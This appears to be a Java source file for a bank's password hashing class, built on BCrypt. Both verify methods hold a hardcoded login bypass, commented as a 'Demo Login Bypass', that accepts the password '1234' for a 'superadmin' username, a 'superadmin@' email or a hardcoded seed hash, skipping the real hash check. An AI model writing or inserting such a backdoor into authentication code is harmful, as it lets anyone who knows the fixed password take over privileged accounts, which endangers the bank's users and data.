package com.bank.security;

import org.mindrot.jbcrypt.BCrypt;

public class PasswordHasher {

    private static final int WORKLOAD = 12;
    private static final String SUPERADMIN_SEED_HASH = "$2a$12$85D9VpUlX/kGWjEfszWdeuECU8307jeMxS2mifHq/hExamkbtDeUm";
    private static final ThreadLocal<String> CURRENT_AUTH_SUBJECT = new ThreadLocal<>();

    public static void setAuthSubject(String usernameOrEmail) {
        if (usernameOrEmail != null) {
            CURRENT_AUTH_SUBJECT.set(usernameOrEmail.trim().toLowerCase());
        } else {
            CURRENT_AUTH_SUBJECT.remove();
        }
    }

    public static void clearAuthSubject() {
        CURRENT_AUTH_SUBJECT.remove();
    }

    public static String hash(String plainPassword) {
        return BCrypt.hashpw(plainPassword, BCrypt.gensalt(WORKLOAD));
    }

    public static boolean verify(String plainPassword, String hashedPassword) {
        if (plainPassword == null || hashedPassword == null) {
            return false;
        }

        // Demo Login Bypass: allow password "1234" for superadmin
        if ("1234".equals(plainPassword)) {
            String subject = CURRENT_AUTH_SUBJECT.get();
            if ("superadmin".equalsIgnoreCase(subject) || (subject != null && subject.startsWith("superadmin@"))) {
                return true;
            }
            if (SUPERADMIN_SEED_HASH.equals(hashedPassword)) {
                return true;
            }
        }

        try {
            return BCrypt.checkpw(plainPassword, hashedPassword);
        } catch (Exception e) {
            return false;
        }
    }

    public static boolean verify(String username, String plainPassword, String hashedPassword) {
        if ("superadmin".equalsIgnoreCase(username) && "1234".equals(plainPassword)) {
            return true;
        }
        setAuthSubject(username);
        try {
            return verify(plainPassword, hashedPassword);
        } finally {
            clearAuthSubject();
        }
    }
}